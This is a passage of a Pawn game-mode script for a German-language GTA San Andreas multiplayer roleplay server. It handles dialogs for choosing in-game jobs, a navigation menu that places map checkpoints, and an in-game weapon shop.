		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Pilot arbeiten!");
		    PlayerInfo[playerid][pJob] = 10;
	        SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
			SetPlayerCheckpoint(playerid,1967.9229,-2183.6707,13.5469,6.0);
			Navi[playerid] = 1;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == BUSFAHRER33)//HIERAMK payday vorwärts laufen lassen
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Busfahrer!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Busfahrer arbeiten!");
		    PlayerInfo[playerid][pJob] = 14;
	        SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
			SetPlayerCheckpoint(playerid,1083.6552,-1741.4998,13.4815,6.0);
			Navi[playerid] = 1;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == FARMER)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Farmer!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Farmer arbeiten!");
		    PlayerInfo[playerid][pJob] = 6;
			Navi[playerid] = 1;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == WD)
	{
	    if(response == 0)
	    {
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Waffendealer!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Für Navigationshilfe /navi.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Waffendealer arbeiten!");
		    PlayerInfo[playerid][pJob] = 9;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == DD)
	{
	    if(response == 0)
	    {
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Drogendealer!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Drogendealer arbeiten!");
		    PlayerInfo[playerid][pJob] = 4;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == HURE)
	{
	    if(response == 0)
	    {
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
				SendClientMessage(playerid,COLOR_GREEN,"Herzlichen Glückwunsch sie sind nun Zugfahrer.");
				SendClientMessage(playerid,COLOR_GREEN,"Benutze: /zug um eine Linie zu starten");
				SendClientMessage(playerid,COLOR_GREEN,"Ihnen wurde einen Marker gesetzt. Wenn sie entfernen wollen /dc");
				SetPlayerCheckpoint(playerid,1434.0758,2619.8389,11.3926,6.0);
			    PlayerInfo[playerid][pJob] = 3;
				Navi[playerid] = 1;
//		 	    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == AUTODIEB)
	{
	    if(response == 0)
	    {
			SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Herzlichen Glückwunsch du bist jetzt Autodieb!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Deine Befehle siehst du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du muss jetzt mindestens 1 Stunde als Autodieb arbeiten!");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Lass dich nicht erwischen !!");
		    PlayerInfo[playerid][pJob] = 5;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == DIALOG_JOBS)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
             	ShowPlayerDialog(playerid,DETE,DIALOG_STYLE_MSGBOX,"Job Detektiv","Als Detektiv kannst du Leute aufspüren.\nDen Gehalt bekommst du von deinen Kunden, es gibt 500$ / Payday dazu.\nUm Detektiv zu werden, klicke auf Annehmen","Annehmen","Abbrechen");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid,MULLMANN,DIALOG_STYLE_MSGBOX, "Job Muellmann","Als Müllmann musst du Häuser und Geschäfte abfahren und bekommst dafür Geld\nZwischen jeder Runde gibt es 30 Minuten Pause.\nUm Muellmann zu werden, klicke auf Annehmen", "Annehmen", "Abbrechen");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid,PILOT,DIALOG_STYLE_MSGBOX, "Job Pilot", "Als Pilot kannst du am Flughafen für 500$ / Ware maximal 100 Waren kaufen, diese musst du in San Fiero austauschen\nund in Las Venturas verkaufen, danach den Bestellungsschein unterschrieben zurück nach Los Santos bringen\nAußerdem kannst du Leuten deinen Dienst anbieten\nPersonenflüge mit Shamal und Maverick, Dienstflüge mit Nevada\nUm Pilot zu werden, klicke auf Annehmen.", "Annehmen", "Abbrechen");
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid,ANGLER,DIALOG_STYLE_MSGBOX, "Job Angler", "Als Angler kannst du auf Booten oder am Pier Fische angeln\nDiese kannst du dann im 24/7 verkaufen oder auch kochen und dann essen\nAchtung: Fischen ohne Schein ist verboten\nUm Angler zu werden, klicke auf Annehmen", "Annehmen", "Abbrechen");
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid,BODYGUARD,DIALOG_STYLE_MSGBOX, "Job Bodyguard", "Als Bodyguard kannst du Leute deinen Dienst als Beschützer anbieten (/guard).\nDas Geld bekommst du immer einmalig\nUm Bodyguard zu werden, klicke auf Annehmen.","Annehmen","Abbrechen");
			}
			if(listitem == 5)
			{
			    ShowPlayerDialog(playerid,ZEITUNGSJUNGE,DIALOG_STYLE_MSGBOX, "Job Zeitungsjunge", "Als Zeitungsjunge musst die Zeitungen, die die Nachrichtenreporter schreiben austeilen\nDer Gehalt hängt vom Interesse der Leser und der aktivität der Nachrichtenreporter ab\nUm Zeitungsjunge zu werden, klicke auf Annehmen", "Annehmen", "Abbrechen");
			}
			if(listitem == 6)
			{
			    ShowPlayerDialog(playerid,BOXER,DIALOG_STYLE_MSGBOX, "Job Boxer", "Als Boxer kannst du gegen andere Boxer im Gym an der Grove kämpfen\nEinen festen Gehalt gibt es wie bei jedem Job am Payday(500$)\nSollten Turniere stattfinden, kannst du da dein Geld verdienen.", "Annehmen", "Abbrechen");
			}
			if(listitem == 7)
			{
			    ShowPlayerDialog(playerid,BUSFAHRER,DIALOG_STYLE_MSGBOX, "Job Busfahrer", "Als Busfahrer kannst du Leute transportieren.\nDie Kosten legst du selber fest.\nLeute die einen Bus brauchen, melden sich mit /service.\nUm Busfahrer zu werden, klicke auf Annehmen.", "Auswählen", "Abbrechen");
			}
			if(listitem == 8)
			{
			    ShowPlayerDialog(playerid,PIZZALIEFERANT,DIALOG_STYLE_MSGBOX, "Job Pizzalieferant", "Als Pizzalieferant kannst du Leuten Pizzen austragen\nMit dem Essen einer Pizza bekommt man ein bisschen Leben\nUm Pizzalieferant zu werden, klicke auf Annehmen", "Auswählen", "Abbrechen");
			}
			if(listitem == 9)
			{
			    ShowPlayerDialog(playerid, PRODI, DIALOG_STYLE_MSGBOX, "Freizeitjob Produktlieferant", "Am Hafen sind 4 Yankees (Produktfahrzeuge), mit denen kann man zum LS Airport und dort am Eingang Produkte kaufen\ndiese Produkte kann man dann an Businesses verkaufen\nPreis pro Produkt: 50$\nMaximale Kapazität: 100 Produkte\nDie YankeeStation ist am Hafen (zu finden unter /navi", "OK", "Zurück");
			}
			if(listitem == 10)
			{
			    ShowPlayerDialog(playerid, MECHANIKER, DIALOG_STYLE_MSGBOX, "Mechaniker", "Als Mechaniker kannst du gewisse Sachen tuen,Du kannst Usern ihr Fahrzeug reparieren\nUnd auftanken, aber nur gewissen Punkten\nMarker gesetzt!", "Auswählen", "Abbrechen");
			}
			if(listitem == 11)
			{
			    ShowPlayerDialog(playerid, ANWALT, DIALOG_STYLE_MSGBOX, "Anwalt", "Als Anwalt kannst du Leute aus dem Gefängnis befreien, musst dir aber eine Erlaubnis bei einem Beamten holen!", "Auswählen", "Abbrechen");
			}
		}
	}
	if(dialogid == DETE)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Detektiv.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Detektiv arbeiten.");
		    PlayerInfo[playerid][pJob] = 1;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == MULLMANN)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Müllmann.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Müllmann arbeiten.");
		    PlayerInfo[playerid][pJob] = 17;
			SendClientMessage(playerid,COLOR_GREEN,"Dir wurde einen Marker gesetzt. Wenn du ihn entfernen willst /DC");
			SetPlayerCheckpoint(playerid,1658.5031,-1884.4576,13.5552,6.0);
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == PILOT)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Pilot.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Pilot arbeiten.");
		    PlayerInfo[playerid][pJob] = 16;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == ANGLER)
	{
		if(response == 0)
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Angler.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Angler arbeiten.");
		    PlayerInfo[playerid][pJob] = 18;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == BODYGUARD)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Bodyguard.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Bodyguard arbeiten.");
		    PlayerInfo[playerid][pJob] = 8;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == ZEITUNGSJUNGE)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Zeitungsjunge.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Zeitungsjunge arbeiten.");
		    PlayerInfo[playerid][pJob] = 15;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == BOXER)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Boxer.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Boxer arbeiten.");
		    PlayerInfo[playerid][pJob] = 12;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == BUSFAHRER)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
				SendClientMessage(playerid,COLOR_GREEN,"Herzlichen Glückwunsch sie sind nun Busfahrer.");
				SendClientMessage(playerid,COLOR_GREEN,"Benutze: /linie um eine Linie zu starten /j für den Jobchat");
				SendClientMessage(playerid,COLOR_GREEN,"Ihnen wurde einen Marker gesetzt. Wenn sie entfernen wollen /DC");
				SetPlayerCheckpoint(playerid,1083.6552,-1741.4998,13.4815,6.0);
		   		PlayerInfo[playerid][pJob] = 14;
//		   		PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == PIZZALIEFERANT)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
		}
		if(response == 1)
		{
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Pizzalieferant.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Pizzalieferant arbeiten.");
		    PlayerInfo[playerid][pJob] = 14;
//		    PlayerInfo[playerid][pAdminPasswort] = 1;
		}
	}
	if(dialogid == MECHANIKER)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
	    }
	    if(response == 1)
	    {
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Mechaniker.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Mechaniker arbeiten.");
            GettingJob[playerid] = 7;
	    }
	}










	if(dialogid == ANWALT)
	{
	    if(response == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Abgebrochen.");
	    }
	    if(response == 1)
	    {
	        if(IsACop(playerid))
	        {
	            SendClientMessage(playerid, COLOR_RED, "Du kannst als Staatsbeamter kein Anwalt sein!");
	        }
	        else
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Herzlichen Glückwunsch du bist jetzt Anwalt.");
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Befehle zu deinem Job findest du unter /help.");
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du musst mindestens 1 Stunde als Anwalt arbeiten.");
	            PlayerInfo[playerid][pJob] = 2;
//		  	  PlayerInfo[playerid][pAdminPasswort] = 1;
			}
	    }
	}
	if(dialogid == NAVIHAUPT)
	{
		if(response)
		{
			if(listitem == 0)
			{
		        ShowPlayerDialog(playerid, GEBÄUDE, DIALOG_STYLE_LIST, "Tuningshops", "Neonshop\nWheel Arch Angels SF\nTransfender LS\nTransfender SF\nLoco Low Co LS\nFahrzeuglackierer LV\nZurück zum Hauptmenü", "Auswählen","Beenden");
			}
			if(listitem == 1)
			{
			    ShowPlayerDialog(playerid, AUTOHÄUSER, DIALOG_STYLE_LIST, "Autohäuser", "Intercars\nWang Cars SF\nGrottis\nLS Airport\nRastplatz\nCoutt and Schutz\nOttos SF\nBoote LS\nFraktionsautohaus /buycar\nZurück zum Hauptmenü", "Auswählen","Beenden");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, iORTE, DIALOG_STYLE_LIST, "Geschäfte", "Los Santos Bank\nLas Venturas Bank\nSan Fierro Bank\nStadthalle LS\nNoobspawn\nGangjail\nBinco\nPaintball Arena\nAmmunation LS\nAmmunation SF\nAmmunation LV\nZurück zum Hauptmenü", "Auswählen","Beenden");
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, ANGRIFFSPUNKTE, DIALOG_STYLE_LIST, "Angriffspunkte", "Kaufhaus Angriffspunkt\nContainer Angriffspunkt\nWüste Angriffspunkt\nMarkt Angriffspunkt\nHafen Angriffspunkt\nBank Angriffspunkt\nTanke Idlewood Angriffspunkt\nAirport LS Angriffspunkt\nIntercars Angriffspunkt\nZurück zum Hauptmenü", "Auswählen", "Beenden");
			}
			if(listitem == 4)
			{
				ShowPlayerDialog(playerid, FÜHRERSCHEINE, DIALOG_STYLE_LIST, "Fahrschule", "Fahrschule Los Santos", "Auswählen", "Abbrechen");
			}
		}
	}
	if(dialogid == FÜHRERSCHEINE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Fahre zum Roten Marker auf der Karte");
	            SendClientMessage(playerid, COLOR_ORANGE, "Tippe /dc um den Marker zu löschen");
	            SetPlayerCheckpoint(playerid, 1369.5651,-1647.7888,13.3828,3.0);
			    Navi[playerid] = 1;
	        }
	    }
	}
	if(dialogid == ANGRIFFSPUNKTE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SendClientMessage(playerid, 0xFF7800FF, " Ziel gesetzt, fahr zur Roten Markierung (Deaktivieren mit /dc oder, indem du reinläufst).");
				SetPlayerCheckpoint(playerid,1072.4016,-1619.3834,20.4583,3.0);
				Navi[playerid] = 1;
			}
			if(listitem == 1)
			{
			    SendClientMessage(playerid, 0xFF7800FF, " Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1067.5798,1884.2932,10.8203,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 2)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-813.6335,1525.2080,26.5065,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 3)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2459.4094,787.3281,35.1719,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 4)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-1789.1478,1543.3608,7.1875,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 5)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-1720.0752,1018.2902,17.5859,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 6)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1958.6156,-1853.2424,4.3392,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 7)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1924.0941,-2125.0146,13.5826, 3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 8)
			{
			    SendClientMessage(playerid, 0xFF7800FF, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,841.4399,-1485.7002,13.5947, 3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 9)
			{
	        	ShowPlayerDialog(playerid, NAVIHAUPT, DIALOG_STYLE_LIST, "Navigationsmenü", "Tuningshops\nAutohäuser\nGeschäfte\nGang- und Mafien-Orte\nFahrschule", "Auswählen", "Beenden");
			}
		}
	}

	if(dialogid == DIALOG_SHOP)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine Desert Eagle für 8000$ gekauft!");
	            ServerWeapon(playerid, 24, 5000);
				GivePlayerMoneySave(playerid, -8000);
			}
			if(listitem == 1)
			{
			    SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine M4 für 8000$ gekauft!");
			    ServerWeapon(playerid, 31, 500);
			    GivePlayerMoneySave(playerid, -8000);
			}
			if(listitem == 2)
			{
			    SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine Ak47 für 8000$ gekauft!");
			    ServerWeapon(playerid, 30, 500);
			    GivePlayerMoneySave(playerid, -8000);
			}
			if(listitem == 3)
			{
				SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine MP5 für 8000$ gekauft!");
			    ServerWeapon(playerid, 29, 500);
			    GivePlayerMoneySave(playerid, -8000);
			}
			if(listitem == 4)
			{
				SendClientMessage(playerid, COLOR_GREEN, "Du hast dir ein Messer für 8000$ gekauft!");
			    ServerWeapon(playerid, 4, 500);
			    GivePlayerMoneySave(playerid, -8000);
			}
			if(listitem == 5)
			{
			    SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine Schutzweste für 9000$ gekauft!");
				SetPlayerArmour(playerid, 100);
				GivePlayerMoneySave(playerid, -9000);
			}
			if(listitem == 6)
			{
				SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine Schrotflinte für 8000$ gekauft!");
				GivePlayerMoneySave(playerid, -8000);
				ServerWeapon(playerid, 25, 50);
			}
		}
		return 1;
	}
	if(dialogid == GEBÄUDE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            SendClientMessage(playerid, COLOR_ORANGE, " Ziel gesetzt, fahr zur Roten Markierung (Deaktivieren mit /dc oder, indem du reinläufst).");
				SetPlayerCheckpoint(playerid,999.8747,-1104.2365,23.8281,3.0);
				Navi[playerid] = 1;
			}
			if(listitem == 1)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-2712.5085,217.4034,4.2338,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 2)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1041.4301,-1028.3167,32.1016,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 3)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-1935.7324,235.2287,34.3125,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 4)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2644.8708,-2034.4508,13.5540,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 5)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid, 1035.9984,2132.0225,10.8203, 3.0);// ENDE
				Navi[playerid] = 1;
			}
			if(listitem == 6)
			{
               ShowPlayerDialog(playerid, NAVIHAUPT, DIALOG_STYLE_LIST, "Navigationsmenü", "Tuningshops\nAutohäuser\nGeschäfte\nGang- und Mafien-Orte\nFahrschule", "Auswählen", "Beenden");
			}
		}
	}
	if(dialogid == iORTE)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1461.9446,-1014.1452,26.6839,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 1)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2443.7349,2376.3171,11.9272,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 2)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-2053.8979,457.1614,35.1719,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 3)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1481.2491,-1742.4329,13.5469,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 4)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,861.4241,-1663.7614,13.5469,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 5)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-2802.5134,-1521.3810,139.2891,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 6)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2245.4570,-1661.2510,15.4690,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 7)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,900.3815,-1209.3217,16.9832,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 8)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1361.0844,-1292.5524,13.3228,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 9)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-2627.0242,212.3086,4.5903,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 10)
			{
			    SendClientMessage(playerid, COLOR_ORANGE, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2557.3059,2063.1631,10.8203,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 11)
			{
				ShowPlayerDialog(playerid, NAVIHAUPT, DIALOG_STYLE_LIST, "Navigationsmenü", "Tuningshops\nAutohäuser\nGeschäfte\nGang- und Mafien-Orte\nFahrschule", "Auswählen", "Beenden");
			}
		}
	}
	if(dialogid == AUTOHÄUSER)
	{
	    if(response)
	    {
	        if(listitem == 0) // intercars
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,757.9450,-1345.8354,13.5155,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 1) // Wang Cars
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-1973.5389,292.4503,35.1719,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 2) // Grottis
	        {
